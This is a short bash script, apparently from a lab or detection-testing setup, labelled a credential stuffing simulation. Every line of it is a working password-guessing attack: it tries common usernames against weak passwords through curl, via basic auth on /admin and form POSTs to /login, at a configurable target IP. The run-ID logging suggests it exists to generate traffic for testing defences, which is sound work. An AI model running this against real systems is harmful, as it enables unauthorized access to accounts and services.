#!/bin/bash
set -eu

RUN_ID="${1:-no-run-id}"
TARGET_IP="${TARGET_IP:-192.168.50.10}"

echo "[run_id=$RUN_ID] Credential stuffing simulation starting target=$TARGET_IP ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
for user in admin root test user guest; do
  for pass in admin 123456 password letmein qwerty; do
    curl -s -o /dev/null -m 4 -u "$user:$pass" "http://$TARGET_IP/admin" || true
    curl -s -o /dev/null -m 4 -X POST "http://$TARGET_IP/login" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -d "username=$user&password=$pass" || true
  done
done
echo "[run_id=$RUN_ID] Credential stuffing simulation done target=$TARGET_IP ts=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
